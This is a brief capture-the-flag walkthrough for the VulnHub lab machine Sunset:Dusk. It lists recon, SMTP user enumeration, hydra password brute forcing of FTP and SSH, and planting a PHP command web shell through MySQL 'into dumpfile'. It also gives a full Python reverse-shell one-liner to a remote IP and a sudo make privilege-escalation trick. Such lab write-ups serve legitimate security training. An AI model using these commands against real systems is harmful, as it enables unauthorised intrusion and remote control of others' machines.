


# Sunset:Dusk Walkthrough 

**VulnHub Link:** [Sunset:Dusk](https://www.vulnhub.com/entry/sunset-dusk,404/)
**Difficulty:** Easy
**Release Date:** 24 Sep 2020

## 1.Reconnaissance
```bash
nmap -A -O -T4 -P -sV 192.168.100.80
```


## 2.Web Enumeration

```bash
dirb http://ip
```

port 25 is open --> └─$ smtp-user-enum -M VRFY -U /usr/share/wordlists/metasploit/default_users_for_services_unhash.txt -t 192.168.100.80
dusk user found --> brute force to ftp service --> hydra -l dusk -P /usr/share/wordlists/rockyou.txt ftp://192.168.100.80 -I
brute force to ssh service hydra -l dusk -P /usr/share/wordlists/rockyou.txt ssh://192.168.100.80 -I

mysql default password --> password
>>> show databases;
>>> use mysql;
>>> create table <name>(line blob);
>>> insert into <name> values('<?php system($_REQUEST[''cmd'']); ?>');
>>> select '<?php system($_REQUEST[''cmd'']); ?>' from <name> into dumpfile '/var/tmp/shell.php'
in url ---> <ip>:8080/shell.php?cmd=cat /home/dusk/user.txt
python reverse_shell --> python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
linpeas downloading

## 3.Privilege Escalation

sudo -u dusk /usr/bin/make -s --eval=$'x:\n\t-'"$COMMAND"
in dusk linpeas
ftp password found
get root.txt
